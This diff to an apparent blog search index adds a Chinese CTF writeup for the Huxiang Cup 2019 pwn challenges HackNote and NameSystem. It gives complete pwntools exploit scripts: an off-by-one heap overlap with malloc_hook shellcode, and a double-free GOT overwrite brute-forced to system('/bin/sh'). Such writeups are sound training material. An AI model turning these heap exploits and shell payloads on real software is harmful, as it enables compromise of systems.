@@ -4,6 +4,27 @@
   
     
     <entry>
+      <title>湖湘杯2019复赛 pwn Writeup</title>
+      <link href="/2019/11/09/hxb2019pwn/"/>
+      <url>/2019/11/09/hxb2019pwn/</url>
+      
+        <content type="html"><![CDATA[<p>湖湘杯2019复赛pwn题的解题过程</p><a id="more"></a><h1 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h1><p>IDA打开发现是静态编译的堆题,没开任何保护,基本操作便是add(),delete(),edit().<br>特点是将malloc得到的指针放在了栈上rsp + 0x20的位置,而size则放在了rsp + 0x20 + 16*8 = rsp + 0xa0的位置,且因为是静态编译,无法使用pwngdb中的heap/fastbins/unsorted等指令,相当于增加了调试难度.</p><h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h3><p>题目中在edit时,修改新的size是用的strlen()函数,因此当我们将chunk中的内容与next_chunk的size连起来时,size就会被 + 2 因此就可以再次edit()来修改next_chunk的size</p><h3 id="堆重叠来获取main-arena-chunk"><a href="#堆重叠来获取main-arena-chunk" class="headerlink" title="堆重叠来获取main_arena_chunk"></a>堆重叠来获取main_arena_chunk</h3><p>具体过程见EXP</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import *sh = process(&#39;./HackNotenew&#39;)#sh = remote(&#39;183.129.189.62&#39;,21004)main_arena_88 = 0x00000000006ca858main_arena_0x61 = 0x6ca828malloc_hook = 0x6CB788chunk_ptr = 0x6cbc40context.log_level = &#39;DEBUG&#39;context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Input the Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;4. Exit&#39;)def add_full(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Input the Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.send(content)    sh.recvuntil(&#39;4. Exit&#39;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Input the Index of Note:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;4. Exit&#39;)</code></pre><pre><code class="python">def edit(index,content):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Input the Index of Note:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.send(content)gdb.attach(sh)sh.recvuntil(&#39;4. Exit&#39;)add(0x108,&#39;aaaa&#39;) #0 暂时不能使用off_by_oneadd(0x200,&#39;b&#39; * 0x1f0 + p64(0x200) ) #1 0x200是fake_prev_size  add(0x100,&#39;cccc&#39;) #2 next_chunkadd(0x100,&#39;dddd&#39; ) #3edit(0,&#39;a&#39; * 0x108) # 这次修改将size改为了0x10a (本来的0x108 + next_chunk的size两字节)delete(1) # [2] prev_size = 0x210 size = 0x110edit(0,&#39;a&#39; * 0x108 + &#39;\n&#39;) # [1] size = 0x200 off_by_one修改add(0xa0,&#39;eeee&#39;) #1 切割原先free的 [1] 被修改的prev_size是一开始add()时写上去的0x200add(0x50,&#39;ffff&#39;) #4 add(0x40,&#39;gggg&#39;) #5# 堆重叠的两个fastbindelete(1)delete(2) #触发合并 size = 0x321 add(0x300,&#39;hhhh&#39;) #1 覆盖[4] [5] 两个fastbindelete(4) delete(5)edit(1,&#39;\x00&#39; * 0xa8 +  p64(0x60) + p64(0x51) + p64(0) *10 + p64(0x51) + p64(0x6cb820) + &#39;\n&#39;) # [4]-&gt;fd = 0x51 目的是修改main_arena 0x6ca828这个地址的值 [5] -&gt; fd = 0x6cb820 fake_chunk_in_main_arena 的地址add(0x50, &#39;aaa&#39;) #4 此时 *0x6ca828 = 0x51add(0x40, &#39;bbb&#39;) #5 此时 *0x6ca820 = 0x6ca820add(0x40, p64(0) * 5 + p64(malloc_hook - 0x10) ) #malloc()得到0x6ca830 修改 main_arena + 88 即 last_remainder 的值为 malloc_hook -0x10 的地址add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) )add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) #malloc()三次是因为之前的unsorted bin 还没切割完,优先级比last_remainder高sh.sendline(&#39;1&#39;)sh.sendlineafter(&quot;Input the Size:&quot;, &#39;64&#39;)sh.interactive()</code></pre><h1 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h1><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用doublefree获取 got表 0x60200a 这一地址的fake_chunk,然后修改free()的got表低四位为system()的0x5390 ,然后free()之前申请的内容为<code>/bin/sh</code>的chunk,若地址正确是就相当于<code>system(&#39;/bin/sh&#39;)</code>然后爆破三位获取shell</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *#context.log_level =&#39;DEBUG&#39;def add(size, content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Name Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Name:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice :&#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;The id you want to delete:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Your choice :&#39;)x = 1while (1):    log.info(&#39;time =&#39; + str(x))    x+=1    sh = process(&#39;./NameSystem&#39;)    #sh = remote(&#39;183.129.189.62&#39;,15905)    sh.recvuntil(&#39;Your choice :&#39;)    for i in range(18):        add(0x40,&#39;aaa&#39;)    #gdb.attach(sh)    add(0x50,&#39;bbb&#39;)    add(0x50,&#39;ccc&#39;)</code></pre><pre><code class="python">    delete(0)    delete(18)    delete(17)    delete(19)    delete(0)    delete(0)    delete(0)    delete(0)    add(0x50,p64(0x601ffa))    add(0x50,&#39;\x00&#39;)    add(0x50,&#39;/bin/sh\x00&#39;)    add(0x50,&#39;\x00&#39; * 14 + &#39;\x90\x53&#39;) #最后三位0x390确定 爆破0x005这三位 &#39;\x00&#39;来自于readin()函数的实现会将&#39;\n&#39;替换成&#39;\x00&#39;     try:        sh.sendline(&#39;3&#39;)        sh.recvuntil(&#39;The id you want to delete:&#39;)        sh.sendline(str(15))        sleep(0.2)        sh.sendline(&#39;ls&#39;)        sh.recv()        sh.sendline(&#39;ls&#39;)    except EOFError:        sh.close()        continue    else:        sh.interactive()</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>hackergame2019 没有bug的教务系统 Writeup</title>
       <link href="/2019/11/02/hackergame2019-easyCPP-wp/"/>
       <url>/2019/11/02/hackergame2019-easyCPP-wp/</url>
@@ -14,9 +35,9 @@
       
         <tags>
             
-            <tag> ctf </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> ctf </tag>
             
         </tags>
       
@@ -35,9 +56,9 @@
       
         <tags>
             
-            <tag> ctf </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> ctf </tag>
             
         </tags>
       
@@ -56,9 +77,9 @@
       
         <tags>
             
-            <tag> ctf </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> ctf </tag>
             
         </tags>
       
@@ -77,9 +98,9 @@
       
         <tags>
             
-            <tag> ctf </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> ctf </tag>
             
         </tags>
       
@@ -98,9 +119,9 @@
       
         <tags>
             
-            <tag> ctf </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> ctf </tag>
             
         </tags>
       
@@ -119,9 +140,9 @@
       
         <tags>
             
-            <tag> ctf </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> ctf </tag>
             
         </tags>
       
@@ -140,9 +161,9 @@
       
         <tags>
             
-            <tag> ctf </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> ctf </tag>
             
         </tags>
       
@@ -180,9 +201,9 @@
       
         <tags>
             
-            <tag> ctf </tag>
-            
             <tag> pwn </tag>
+            
+            <tag> ctf </tag>
             
         </tags>
       
